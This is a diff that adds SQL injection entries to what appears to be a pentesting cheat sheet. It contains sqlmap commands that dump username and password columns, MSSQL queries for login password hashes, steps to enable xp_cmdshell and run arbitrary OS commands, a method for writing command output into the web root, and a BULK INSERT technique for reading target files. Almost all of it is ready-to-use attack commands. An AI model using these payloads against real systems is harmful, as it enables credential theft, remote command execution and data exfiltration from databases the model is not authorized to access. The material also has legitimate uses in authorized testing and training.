@@ -50,3 +50,30 @@ Blind SQL Injection
 blind2.sh 20 //checks 20 characters of query result
 blind3.sh 20 "Select user()" //checks 20 characters of result of custom query sent to db
 ```
+```
+SQLMap
+sqlmap -u 'http://sqlmap.com/search.php?search=n' -p search --technique=U -D blogdb -T users -C username,password --dump
+sqlmap -r /root/bloglogin.req -p user --technique=B --banner //uses saved Burpsuite request
+```
+```
+SELECT name, password FROM master..sysxlogins //MSSQL Server 2000
+SELECT name, password_hash FROM master.sys.sql_logins //For MSSQL Server >=2005
+EXEC master..xp_cmdshell '<command>' //Can be used to run any OS command, need sa privs
+
+//Enable xp_cmdshell as sa user or with sa privs
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+//Read the result of the dir command by saving output to web accessible folder
+EXEC master..xp_cmdshell 'dir c:\ > C:\inetpub\wwwroot\site\dir.txt'--
+//can browse to dir.txt at the URL, http://site.com/dir.txt
+
+//Put file content into a table and extract the table via SQLi
+CREATE TABLE filecontent(line varcar(8000));
+BULK INSERT filecontent FROM '<target file>';
+/* Remember to drop the table after extracting it:
+DROP TABLE filecontent;
+*/
+```
